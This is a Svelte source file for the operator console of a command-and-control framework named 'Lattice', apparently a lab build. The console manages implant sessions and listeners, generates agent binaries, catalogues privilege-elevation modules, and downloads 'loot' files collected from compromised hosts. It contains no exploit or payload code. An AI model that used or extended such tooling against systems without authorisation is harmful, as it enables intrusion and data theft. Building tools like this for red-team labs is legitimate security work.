<script lang="ts">
  import {
    accountName,
    AuthRequiredError,
    clearOperatorToken,
    deleteLoot,
    deleteSession,
    downloadBytes,
    formatPromptPath,
    generateAgent,
    getLoot,
    listAgentUpdates,
    listElevateModules,
    listListeners,
    listLoot,
    listSessions,
    loadOperatorToken,
    loadPathDisplay,
    login,
    logout,
    reloadExtensions,
    savePathDisplay,
    setAgentSleep,
    setSessionNote,
    userAtHost,
    type AgentUpdate,
    type ElevateModule,
    type Listener,
    type LootItem,
    type PathDisplay,
    type Session,
  } from "./lib/api";
  import ConsoleView from "./lib/ConsoleView.svelte";
  import DocsView from "./lib/DocsView.svelte";

  type NavId = "sessions" | "console" | "listeners" | "docs" | "settings";

  const pageSize = 50;

  let sessions = $state<Session[]>([]);
  let totalCount = $state(0);
  let activeCount = $state(0);
  let nextPageToken = $state("");
  let pageTokens = $state<string[]>([""]);
  let pageIndex = $state(0);
  let query = $state("");
  let queryInput = $state("");
  let error = $state("");
  let listLoading = $state(false);
  let nav = $state<NavId>("sessions");
  let selectedAgent = $state("");
  let selectedSession = $state<Session | null>(null);
  let sidebarExpanded = $state(false);
  let pathDisplay = $state<PathDisplay>(loadPathDisplay());
  let consoleOpenAgentId = $state<string | null>(null);
  let searchTimer: ReturnType<typeof setTimeout> | undefined;
  let listeners = $state<Listener[]>([]);
  let listenersLoading = $state(false);
  let reloadBusy = $state(false);
  let agentUpdates = $state<AgentUpdate[]>([]);
  let elevateModules = $state<ElevateModule[]>([]);
  let catalogsLoading = $state(false);

  let authRequired = $state(false);
  let loginUser = $state("admin");
  let loginPass = $state("");
  let loginBusy = $state(false);
  let loginError = $state("");
  let operatorName = $state("");

  let noteDrafts = $state<Record<string, string>>({});
  let sleepEditId = $state("");
  let sleepSecondsInput = $state(5);
  let sleepJitterInput = $state(0);
  let sleepBusy = $state(false);

  let lootItems = $state<LootItem[]>([]);
  let lootTotal = $state(0);
  let lootLoading = $state(false);
  let lootBusyId = $state("");

  let genServerUrl = $state("https://127.0.0.1:8443");
  let genOs = $state("windows");
  let genArch = $state("amd64");
  let genSleep = $state(5);
  let genJitter = $state(0);
  let genInsecure = $state(true);
  let genEmbedToken = $state(false);
  let genBusy = $state(false);
  let genStatus = $state("");

  const selected = $derived(
    selectedSession && selectedSession.agentId === selectedAgent
      ? selectedSession
      : sessions.find((s) => s.agentId === selectedAgent) ?? null,
  );

  function guessDefaultCwd(osName?: string): string {
    if ((osName || "").toLowerCase().includes("windows")) return "C:\\";
    return "/";
  }

  function isOnline(s: Session, now = Date.now()): boolean {
    if (!s.lastSeen) return false;
    const t = Date.parse(s.lastSeen);
    if (Number.isNaN(t)) return false;
    return now - t < 30_000;
  }

  function selectSession(s: Session) {
    selectedAgent = s.agentId;
    selectedSession = s;
  }

  function openConsole(agentId?: string, session?: Session) {
    if (session) selectSession(session);
    else if (agentId) selectedAgent = agentId;
    nav = "console";
    const id = agentId || selectedAgent;
    if (id) consoleOpenAgentId = id;
  }

  function setPathDisplay(mode: PathDisplay) {
    pathDisplay = mode;
    savePathDisplay(mode);
  }

  function handleAuthError(e: unknown): boolean {
    if (e instanceof AuthRequiredError) {
      clearOperatorToken();
      authRequired = true;
      loginError = "";
      return true;
    }
    return false;
  }

  async function submitLogin() {
    loginBusy = true;
    loginError = "";
    error = "";
    try {
      const res = await login(loginUser.trim(), loginPass);
      operatorName = res.username;
      loginPass = "";
      authRequired = false;
      await loadPage(0);
    } catch (e) {
      loginError = e instanceof Error ? e.message : String(e);
    } finally {
      loginBusy = false;
    }
  }

  async function onLogout() {
    error = "";
    try {
      await logout();
    } catch {
      clearOperatorToken();
    }
    operatorName = "";
    authRequired = true;
    sessions = [];
    totalCount = 0;
    activeCount = 0;
    lootItems = [];
  }

  function sleepLabel(s: Session): string {
    const sleep = s.sleepSeconds ?? 0;
    const jitter = s.jitterPercent ?? 0;
    let base = `${sleep}s`;
    if (jitter > 0) base += ` ±${jitter}%`;
    if (s.hasDesiredSleep) {
      const ds = s.desiredSleepSeconds ?? 0;
      const dj = s.desiredJitterPercent ?? 0;
      let pending = `${ds}s`;
      if (dj > 0) pending += ` ±${dj}%`;
      return `${base} → ${pending}`;
    }
    return base;
  }

  function noteValue(s: Session): string {
    return noteDrafts[s.agentId] ?? s.note ?? "";
  }

  async function commitNote(s: Session) {
    const next = (noteDrafts[s.agentId] ?? s.note ?? "").trimEnd();
    if (next === (s.note ?? "")) return;
    error = "";
    try {
      const updated = await setSessionNote(s.agentId, next);
      sessions = sessions.map((row) => (row.agentId === s.agentId ? { ...row, ...updated } : row));
      if (selectedSession?.agentId === s.agentId) selectedSession = { ...selectedSession, ...updated };
      const { [s.agentId]: _, ...rest } = noteDrafts;
      noteDrafts = rest;
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    }
  }

  function openSleepEdit(s: Session, e: MouseEvent) {
    e.stopPropagation();
    sleepEditId = s.agentId;
    sleepSecondsInput = Number(s.hasDesiredSleep ? s.desiredSleepSeconds : s.sleepSeconds) || 5;
    sleepJitterInput = Number(s.hasDesiredSleep ? s.desiredJitterPercent : s.jitterPercent) || 0;
  }

  async function applySleep() {
    if (!sleepEditId) return;
    sleepBusy = true;
    error = "";
    try {
      const updated = await setAgentSleep(
        sleepEditId,
        Math.max(0, Math.floor(sleepSecondsInput)),
        Math.min(100, Math.max(0, Math.floor(sleepJitterInput))),
      );
      sessions = sessions.map((row) => (row.agentId === sleepEditId ? { ...row, ...updated } : row));
      if (selectedSession?.agentId === sleepEditId) selectedSession = { ...selectedSession, ...updated };
      sleepEditId = "";
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      sleepBusy = false;
    }
  }

  async function loadPage(index: number) {
    listLoading = true;
    error = "";
    try {
      const token = pageTokens[index] ?? "";
      const res = await listSessions({
        pageSize,
        pageToken: token || undefined,
        query: query || undefined,
      });
      authRequired = false;
      sessions = res.sessions;
      totalCount = res.totalCount;
      activeCount = res.activeCount;
      nextPageToken = res.nextPageToken;
      pageIndex = index;
      if (res.nextPageToken) {
        pageTokens = [...pageTokens.slice(0, index + 1), res.nextPageToken];
      } else {
        pageTokens = pageTokens.slice(0, index + 1);
      }
      const fresh = sessions.find((s) => isOnline(s));
      if (!selectedAgent) {
        if (fresh) selectSession(fresh);
        else if (sessions.length > 0) selectSession(sessions[0]);
      } else {
        const onPage = sessions.find((s) => s.agentId === selectedAgent);
        if (onPage) selectedSession = onPage;
        if (selectedSession && !isOnline(selectedSession) && fresh) {
          selectSession(fresh);
        }
      }
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      listLoading = false;
    }
  }

  function applySearch() {
    query = queryInput.trim();
    pageTokens = [""];
    pageIndex = 0;
    void loadPage(0);
  }

  function scheduleSearch() {
    clearTimeout(searchTimer);
    searchTimer = setTimeout(() => applySearch(), 250);
  }

  async function removeSession(agentId: string) {
    error = "";
    try {
      await deleteSession(agentId);
      if (selectedAgent === agentId) {
        selectedAgent = "";
        selectedSession = null;
      }
      await loadPage(pageIndex);
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    }
  }

  $effect(() => {
    if (authRequired) return;
    void loadPage(0);
  });

  $effect(() => {
    if (nav !== "sessions" || authRequired) return;
    const idx = pageIndex;
    const id = setInterval(() => {
      void loadPage(idx);
    }, 15000);
    return () => clearInterval(id);
  });

  async function loadListeners() {
    listenersLoading = true;
    try {
      listeners = await listListeners();
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      listenersLoading = false;
    }
  }

  $effect(() => {
    if (nav !== "listeners" || authRequired) return;
    void loadListeners();
    const id = setInterval(() => {
      void loadListeners();
    }, 15000);
    return () => clearInterval(id);
  });

  async function onReloadExtensions() {
    reloadBusy = true;
    error = "";
    try {
      const started = await reloadExtensions();
      await loadListeners();
      if (started.length === 0) {
        error = "reload finished with no channels started";
      }
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      reloadBusy = false;
    }
  }

  async function loadCatalogs() {
    catalogsLoading = true;
    try {
      const [updates, modules] = await Promise.all([listAgentUpdates(), listElevateModules()]);
      agentUpdates = updates;
      elevateModules = modules;
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      catalogsLoading = false;
    }
  }

  async function loadLoot() {
    lootLoading = true;
    try {
      const res = await listLoot({ pageSize: 100 });
      lootItems = res.items;
      lootTotal = res.totalCount;
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      lootLoading = false;
    }
  }

  async function downloadLootItem(item: LootItem) {
    lootBusyId = item.lootId;
    error = "";
    try {
      const res = await getLoot(item.lootId, true);
      const name = item.name || item.remotePath.split(/[/\\]/).pop() || `loot-${item.lootId.slice(0, 8)}`;
      downloadBytes(res.data, name, item.contentType || "application/octet-stream");
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      lootBusyId = "";
    }
  }

  async function removeLootItem(item: LootItem) {
    lootBusyId = item.lootId;
    error = "";
    try {
      await deleteLoot(item.lootId);
      await loadLoot();
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      lootBusyId = "";
    }
  }

  async function onGenerateAgent() {
    genBusy = true;
    genStatus = "";
    error = "";
    try {
      const res = await generateAgent({
        serverUrl: genServerUrl.trim(),
        os: genOs,
        arch: genArch,
        sleepSeconds: Math.max(0, Math.floor(genSleep)),
        jitterPercent: Math.min(100, Math.max(0, Math.floor(genJitter))),
        insecureTls: genInsecure,
        embedAgentToken: genEmbedToken,
      });
      const ext = genOs === "windows" ? ".exe" : "";
      const filename =
        res.path.split(/[/\\]/).pop() || `agent-${res.os}-${res.arch}${ext}`;
      downloadBytes(res.data, filename);
      genStatus = `Downloaded ${filename} (${res.size.toLocaleString()} bytes, ${res.sha256.slice(0, 12)}…)`;
    } catch (e) {
      if (handleAuthError(e)) return;
      error = e instanceof Error ? e.message : String(e);
    } finally {
      genBusy = false;
    }
  }

  $effect(() => {
    if (nav !== "settings" || authRequired) return;
    void loadCatalogs();
    void loadLoot();
  });
</script>

{#if authRequired}
  <div class="app-window login-gate">
    <header class="titlebar">
      <div class="title-block">
        <div class="brand">Lattice</div>
        <div class="descriptor">Operator login</div>
      </div>
    </header>
    <div class="login-body">
      <form
        class="login-form"
        onsubmit={(e) => {
          e.preventDefault();
          void submitLogin();
        }}
      >
        <header class="settings-section-head">
          <h3>Sign in</h3>
          <p>
            Default lab credentials are <span class="mono">admin</span> /
            <span class="mono">lattice-change-me</span>. Auth is on unless
            <span class="mono">LATTICE_AUTH_DISABLED=true</span>.
          </p>
        </header>
        <label class="settings-field">
          <span class="settings-field-label">
            <span class="settings-field-title">Username</span>
          </span>
          <input class="search login-input" bind:value={loginUser} autocomplete="username" />
        </label>
        <label class="settings-field">
          <span class="settings-field-label">
            <span class="settings-field-title">Password</span>
          </span>
          <input
            class="search login-input"
            type="password"
            bind:value={loginPass}
            autocomplete="current-password"
          />
        </label>
        {#if loginError}
          <p class="login-error">{loginError}</p>
        {/if}
        <button class="ghost-btn login-submit" type="submit" disabled={loginBusy}>
          {loginBusy ? "Signing in…" : "Sign in"}
        </button>
      </form>
    </div>
  </div>
{:else}
<div class="app-window">
  <header class="titlebar">
    <div class="title-block">
      <div class="brand">Lattice</div>
      <div class="descriptor">Operator console</div>
    </div>
  </header>

  <div class="shell">
    <aside class="sidebar" class:expanded={sidebarExpanded}>
      <div class="sidebar-top">
        <button
          class="nav-item"
          title={sidebarExpanded ? "Collapse" : "Expand"}
          aria-label="Toggle navigation"
          onclick={() => (sidebarExpanded = !sidebarExpanded)}
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            {#if sidebarExpanded}
              <path d="M15 18l-6-6 6-6" />
            {:else}
              <path d="M9 18l6-6-6-6" />
            {/if}
          </svg>
        </button>
      </div>
      <nav class="nav-group">
        <button class="nav-item" class:active={nav === "sessions"} title="Sessions" onclick={() => (nav = "sessions")}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" /><path d="M8 21h8M12 17v4" /></svg>
          <span class="nav-label">Sessions</span>
        </button>
        <button class="nav-item" class:active={nav === "console"} title="Console" onclick={() => openConsole()}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5" /><line x1="12" y1="19" x2="20" y2="19" /></svg>
          <span class="nav-label">Console</span>
        </button>
        <button class="nav-item" class:active={nav === "listeners"} title="Listeners" onclick={() => (nav = "listeners")}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0" /><path d="M1.42 9a16 16 0 0 1 21.16 0" /><path d="M8.53 16.11a6 6 0 0 1 6.95 0" /><circle cx="12" cy="20" r="1" /></svg>
          <span class="nav-label">Listeners</span>
        </button>
      </nav>
      <div class="sidebar-spacer"></div>
      <button class="nav-item" class:active={nav === "docs"} title="Documentation" onclick={() => (nav = "docs")}>
        <!-- Lucide "book-open": https://lucide.dev/icons/book-open -->
        <svg
          width="18"
          height="18"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2"
          stroke-linecap="round"
          stroke-linejoin="round"
          aria-hidden="true"
        >
          <path d="M12 7v14" />
          <path
            d="M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"
          />
        </svg>
        <span class="nav-label">Docs</span>
      </button>
      <button class="nav-item" class:active={nav === "settings"} title="Settings" onclick={() => (nav = "settings")}>
        <!-- Lucide "settings" gear: https://lucide.dev/icons/settings -->
        <svg
          width="18"
          height="18"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2"
          stroke-linecap="round"
          stroke-linejoin="round"
          aria-hidden="true"
        >
          <path
            d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"
          />
          <circle cx="12" cy="12" r="3" />
        </svg>
        <span class="nav-label">Settings</span>
      </button>
    </aside>

    <section class="workspace">
      <div class="workspace-body">
        {#if nav === "sessions"}
          <div class="surface">
            <div class="heading">
              <div>
                <h2>Sessions</h2>
                <p>{totalCount.toLocaleString()} agent{totalCount === 1 ? "" : "s"} · page {pageIndex + 1}</p>
              </div>
              <div class="heading-actions">
                <input
                  class="search"
                  placeholder="Search id, host, user, os…"
                  bind:value={queryInput}
                  oninput={() => scheduleSearch()}
                  onkeydown={(e) => {
                    if (e.key === "Enter") applySearch();
                  }}
                />
              </div>
            </div>
            <div class="pane-body grow flush">
              {#if sessions.length === 0}
                <div class="empty">
                  <strong>{query ? "No matches" : "No sessions yet"}</strong>
                  <span
                    >{#if query}Try a different query.{:else}Start the Docker lab agent (<span class="mono">packager/docker/docker-compose.lab.yml</span>) or point an implant at <span class="mono">https://127.0.0.1:8443</span>.{/if}</span
                  >
                </div>
              {:else}
                <table class="sessions">
                  <thead>
                    <tr>
                      <th>Agent</th>
                      <th>User@Host</th>
                      <th>Status</th>
                      <th>Platform</th>
                      <th>Sleep</th>
                      <th>Note</th>
                      <th>Features</th>
                      <th>Last seen</th>
                      <th></th>
                    </tr>
                  </thead>
                  <tbody>
                    {#each sessions as s}
                      <tr
                        class:selected={selectedAgent === s.agentId}
                        onclick={() => selectSession(s)}
                        ondblclick={() => openConsole(s.agentId, s)}
                      >
                        <td class="mono" title={s.agentId}>{s.agentId.slice(0, 8)}…</td>
                        <td>{userAtHost(s.username, s.hostname)}</td>
                        <td class={isOnline(s) ? "status-on" : "status-off"}>{isOnline(s) ? "online" : "offline"}</td>
                        <td>{s.os}/{s.arch}</td>
                        <td class="mono" title={sleepLabel(s)}>{sleepLabel(s)}</td>
                        <td onclick={(e) => e.stopPropagation()}>
                          <input
                            class="note-input"
                            placeholder="Add note…"
                            value={noteValue(s)}
                            oninput={(e) => {
                              noteDrafts = {
                                ...noteDrafts,
                                [s.agentId]: (e.currentTarget as HTMLInputElement).value,
                              };
                            }}
                            onblur={() => void commitNote(s)}
                            onkeydown={(e) => {
                              if (e.key === "Enter") {
                                e.preventDefault();
                                (e.currentTarget as HTMLInputElement).blur();
                              }
                            }}
                          />
                        </td>
                        <td>
                          {#if (s.features?.length ?? 0) > 0 && (s.features?.length ?? 0) <= 4}
                            <div class="chip-row">
                              {#each s.features ?? [] as f}
                                <span class="chip">{f}</span>
                              {/each}
                            </div>
                          {:else if (s.features?.length ?? 0) > 4}
                            <div class="chip-row">
                              {#each (s.features ?? []).slice(0, 3) as f}
                                <span class="chip">{f}</span>
                              {/each}
                              <span class="chip muted-chip">+{(s.features?.length ?? 0) - 3}</span>
                            </div>
                          {:else}
                            <span class="muted">—</span>
                          {/if}
                        </td>
                        <td class="mono">{s.lastSeen ?? "—"}</td>
                        <td class="row-actions">
                          <button
                            class="ghost-btn"
                            onclick={(e) => {
                              e.stopPropagation();
                              openConsole(s.agentId, s);
                            }}>Console</button
                          >
                          <button class="ghost-btn" onclick={(e) => openSleepEdit(s, e)}>Sleep</button>
                          <button
                            class="ghost-btn"
                            onclick={(e) => {
                              e.stopPropagation();
                              void removeSession(s.agentId);
                            }}>Remove</button
                          >
                        </td>
                      </tr>
                      {#if sleepEditId === s.agentId}
                        <tr class="sleep-edit-row" onclick={(e) => e.stopPropagation()}>
                          <td colspan="9">
                            <div class="sleep-edit">
                              <label>
                                <span>Sleep (s)</span>
                                <input
                                  class="search login-input"
                                  type="number"
                                  min="0"
                                  bind:value={sleepSecondsInput}
                                />
                              </label>
                              <label>
                                <span>Jitter %</span>
                                <input
                                  class="search login-input"
                                  type="number"
                                  min="0"
                                  max="100"
                                  bind:value={sleepJitterInput}
                                />
                              </label>
                              <button class="ghost-btn" disabled={sleepBusy} onclick={() => void applySleep()}
                                >{sleepBusy ? "Saving…" : "Apply"}</button
                              >
                              <button class="ghost-btn" onclick={() => (sleepEditId = "")}>Cancel</button>
                              <span class="muted">Applied on next check-in.</span>
                            </div>
                          </td>
                        </tr>
                      {/if}
                    {/each}
                  </tbody>
                </table>
              {/if}
            </div>
            <div class="pager">
              <button class="ghost-btn" disabled={pageIndex === 0 || listLoading} onclick={() => loadPage(pageIndex - 1)}
                >Previous</button
              >
              <span class="muted"
                >{sessions.length ? pageIndex * pageSize + 1 : 0}–{pageIndex * pageSize + sessions.length} of {totalCount.toLocaleString()}</span
              >
              <button
                class="ghost-btn"
                disabled={!nextPageToken || listLoading}
                onclick={() => loadPage(pageIndex + 1)}>Next</button
              >
            </div>
          </div>
        {:else if nav === "listeners"}
          <div class="surface">
            <div class="heading">
              <div>
                <h2>Listeners</h2>
                <p>
                  {#if listenersLoading && listeners.length === 0}
                    Loading channels…
                  {:else}
                    {listeners.length} running channel{listeners.length === 1 ? "" : "s"} from the extension loader.
                  {/if}
                </p>
              </div>
              <div class="heading-actions">
                <button class="ghost-btn" disabled={reloadBusy} onclick={() => onReloadExtensions()}
                  >{reloadBusy ? "Reloading…" : "Reload extensions"}</button
                >
              </div>
            </div>
            <div class="pane-body grow flush">
              {#if listeners.length === 0}
                <div class="empty">
                  <strong>No listeners</strong>
                  <span>Start the teamserver so channel manifests can bind.</span>
                </div>
              {:else}
                <table class="sessions">
                  <thead>
                    <tr>
                      <th>Name</th>
                      <th>Kind</th>
                      <th>Bind</th>
                      <th>TLS</th>
                      <th>Status</th>
                      <th>Version</th>
                    </tr>
                  </thead>
                  <tbody>
                    {#each listeners as l (l.name)}
                      <tr>
                        <td class="mono">{l.name}</td>
                        <td>{l.kind}</td>
                        <td class="mono">{l.bind}</td>
                        <td>{l.tls ? "on" : "off"}</td>
                        <td>
                          <span class="pill" class:online={l.status === "running"}>{l.status || "unknown"}</span>
                        </td>
                        <td class="mono">{l.version || "—"}</td>
                      </tr>
                    {/each}
                  </tbody>
                </table>
              {/if}
            </div>
          </div>
        {:else if nav === "docs"}
          <DocsView />
        {:else if nav === "settings"}
          <div class="surface">
            <div class="heading">
              <div>
                <h2>Settings</h2>
                <p>Preferences for this browser profile. Changes apply immediately.</p>
              </div>
            </div>
            <div class="pane-body settings-page">
              <section class="settings-section">
                <header class="settings-section-head">
                  <h3>Account</h3>
                  <p>
                    Operator session for the Connect API.
                    {#if operatorName}
                      Signed in as <span class="mono">{operatorName}</span>.
                    {:else if loadOperatorToken()}
                      Bearer token stored in this browser.
                    {/if}
                    Default lab user is <span class="mono">admin</span> /
                    <span class="mono">lattice-change-me</span>.
                  </p>
                </header>
                <div class="settings-field">
                  <div class="settings-field-label">
                    <span class="settings-field-title">Session</span>
                    <span class="settings-field-desc">Revoke the token on the teamserver and clear local storage.</span>
                  </div>
                  <button class="ghost-btn" type="button" onclick={() => void onLogout()}>Log out</button>
                </div>
              </section>

              <section class="settings-section">
                <header class="settings-section-head">
                  <h3>Terminal</h3>
                  <p>Prompt appearance for the operator console.</p>
                </header>

                <div class="settings-field">
                  <div class="settings-field-label">
                    <span class="settings-field-title">Path in prompt</span>
                    <span class="settings-field-desc"
                      >Choose whether the working directory shows in full or as the last segment.</span
                    >
                  </div>
                  <div class="segmented" role="group" aria-label="Path in prompt">
                    <button
                      type="button"
                      class:active={pathDisplay === "full"}
                      onclick={() => setPathDisplay("full")}>Full</button
                    >
                    <button
                      type="button"
                      class:active={pathDisplay === "partial"}
                      onclick={() => setPathDisplay("partial")}>Partial</button
                    >
                  </div>
                </div>

                <div class="settings-preview">
                  <div class="settings-preview-label">Prompt preview</div>
                  <div class="settings-preview-box mono">
                    <span class="term-identity"
                      >{accountName(selected?.username || "user", selected?.hostname || "host")}</span
                    >@<span class="term-path">{selected?.hostname || "host"}</span>:<span class="term-path"
                      >{formatPromptPath(selected?.cwd || guessDefaultCwd(selected?.os), pathDisplay) ||
                        guessDefaultCwd(selected?.os)}</span
                    >
                    <span class="term-prompt"> $</span>
                  </div>
                  <div class="settings-preview-meta">
                    {#if pathDisplay === "full"}
                      Example: <span class="mono">C:\Users\Paul Beck</span>
                    {:else}
                      Example: <span class="mono">Paul Beck</span> (last path segment)
                    {/if}
                  </div>
                </div>
              </section>

              <section class="settings-section">
                <header class="settings-section-head">
                  <h3>Connection</h3>
                  <p>Where this UI talks to Lattice. Read-only in the lab build.</p>
                </header>
                <div class="settings-kv">
                  <div>
                    <span class="settings-k">Operator API</span>
                    <span class="settings-v mono">http://127.0.0.1:8080</span>
                  </div>
                  <div>
                    <span class="settings-k">Agent channel</span>
                    <span class="settings-v mono">https://127.0.0.1:8443</span>
                  </div>
                </div>
              </section>

              <section class="settings-section">
                <header class="settings-section-head">
                  <h3>Agent updates</h3>
                  <p>
                    Published binaries agents can pull with <span class="mono">update</span>. Publish with
                    <span class="mono">publish-agent</span>.
                    {#if catalogsLoading}<span class="muted"> Loading…</span>{/if}
                  </p>
                </header>
                {#if agentUpdates.length === 0}
                  <p class="muted">No updates in the catalog.</p>
                {:else}
                  <table class="sessions catalog-table">
                    <thead>
                      <tr>
                        <th>Version</th>
                        <th>OS</th>
                        <th>Arch</th>
                        <th>Size</th>
                        <th>SHA-256</th>
                      </tr>
                    </thead>
                    <tbody>
                      {#each agentUpdates as u (`${u.version}-${u.os}-${u.arch}`)}
                        <tr>
                          <td class="mono">{u.version}</td>
                          <td>{u.os}</td>
                          <td>{u.arch}</td>
                          <td class="mono">{u.size.toLocaleString()}</td>
                          <td class="mono">{u.sha256.slice(0, 12)}…</td>
                        </tr>
                      {/each}
                    </tbody>
                  </table>
                {/if}
              </section>

              <section class="settings-section">
                <header class="settings-section-head">
                  <h3>Elevation modules</h3>
                  <p>
                    BYO modules tasked with <span class="mono">elevate &lt;name&gt;</span>. Publish with
                    <span class="mono">publish-module</span>.
                  </p>
                </header>
                {#if elevateModules.length === 0}
                  <p class="muted">No elevation modules in the catalog.</p>
                {:else}
                  <table class="sessions catalog-table">
                    <thead>
                      <tr>
                        <th>Name</th>
                        <th>Version</th>
                        <th>OS</th>
                        <th>Arch</th>
                        <th>Description</th>
                      </tr>
                    </thead>
                    <tbody>
                      {#each elevateModules as m (`${m.name}-${m.version}-${m.os}-${m.arch}`)}
                        <tr>
                          <td class="mono">{m.name}</td>
                          <td class="mono">{m.version}</td>
                          <td>{m.os}</td>
                          <td>{m.arch}</td>
                          <td>{m.description || "—"}</td>
                        </tr>
                      {/each}
                    </tbody>
                  </table>
                {/if}
              </section>

              <section class="settings-section">
                <header class="settings-section-head">
                  <h3>Generate agent</h3>
                  <p>Cross-compile a reference agent binary via <span class="mono">GenerateAgent</span> and download it.</p>
                </header>
                <div class="gen-grid">
                  <label class="settings-field gen-field">
                    <span class="settings-field-title">Server URL</span>
                    <input class="search login-input" bind:value={genServerUrl} placeholder="https://host:8443" />
                  </label>
                  <label class="settings-field gen-field">
                    <span class="settings-field-title">OS</span>
                    <select class="search login-input" bind:value={genOs}>
                      <option value="windows">windows</option>
                      <option value="linux">linux</option>
                      <option value="darwin">darwin</option>
                    </select>
                  </label>
                  <label class="settings-field gen-field">
                    <span class="settings-field-title">Arch</span>
                    <select class="search login-input" bind:value={genArch}>
                      <option value="amd64">amd64</option>
                      <option value="arm64">arm64</option>
                    </select>
                  </label>
                  <label class="settings-field gen-field">
                    <span class="settings-field-title">Sleep (s)</span>
                    <input class="search login-input" type="number" min="0" bind:value={genSleep} />
                  </label>
                  <label class="settings-field gen-field">
                    <span class="settings-field-title">Jitter %</span>
                    <input class="search login-input" type="number" min="0" max="100" bind:value={genJitter} />
                  </label>
                  <label class="check-row">
                    <input type="checkbox" bind:checked={genInsecure} />
                    <span>Insecure TLS (lab self-signed)</span>
                  </label>
                  <label class="check-row">
                    <input type="checkbox" bind:checked={genEmbedToken} />
                    <span>Embed agent token</span>
                  </label>
                </div>
                <div class="settings-field">
                  <button class="ghost-btn" type="button" disabled={genBusy} onclick={() => void onGenerateAgent()}
                    >{genBusy ? "Building…" : "Generate & download"}</button
                  >
                  {#if genStatus}
                    <span class="muted">{genStatus}</span>
                  {/if}
                </div>
              </section>

              <section class="settings-section">
                <header class="settings-section-head">
                  <h3>Loot</h3>
                  <p>
                    Files collected from agents ({lootTotal.toLocaleString()}).
                    {#if lootLoading}<span class="muted"> Loading…</span>{/if}
                  </p>
                </header>
                {#if lootItems.length === 0}
                  <p class="muted">No loot yet.</p>
                {:else}
                  <table class="sessions catalog-table">
                    <thead>
                      <tr>
                        <th>Name</th>
                        <th>Agent</th>
                        <th>Size</th>
                        <th>Created</th>
                        <th></th>
                      </tr>
                    </thead>
                    <tbody>
                      {#each lootItems as item (item.lootId)}
                        <tr>
                          <td>
                            <div class="mono">{item.name || "—"}</div>
                            {#if item.remotePath}
                              <div class="muted mono">{item.remotePath}</div>
                            {/if}
                          </td>
                          <td class="mono" title={item.agentId}>{item.agentId.slice(0, 8)}…</td>
                          <td class="mono">{item.size.toLocaleString()}</td>
                          <td class="mono">{item.createdAt ?? "—"}</td>
                          <td class="row-actions">
                            <button
                              class="ghost-btn"
                              disabled={lootBusyId === item.lootId}
                              onclick={() => void downloadLootItem(item)}>Download</button
                            >
                            <button
                              class="ghost-btn"
                              disabled={lootBusyId === item.lootId}
                              onclick={() => void removeLootItem(item)}>Delete</button
                            >
                          </td>
                        </tr>
                      {/each}
                    </tbody>
                  </table>
                {/if}
              </section>
            </div>
          </div>
        {/if}

        <!-- Keep mounted so tabs/panes/scrollback survive leaving Console. -->
        <div class="console-host" class:visible={nav === "console"} aria-hidden={nav !== "console"}>
          <ConsoleView pathDisplay={pathDisplay} bind:openAgentId={consoleOpenAgentId} />
        </div>
      </div>

      <footer class="footer-bar">
        <span
          ><span class="live">●</span>
          {activeCount.toLocaleString()} active session{activeCount === 1 ? "" : "s"}</span
        >
        <span>↑↓ history · Ctrl+L clear · Ctrl+C cancel · right-click to split</span>
      </footer>
    </section>
  </div>

  {#if error}
    <p class="error-banner">{error}</p>
  {/if}
</div>
{/if}
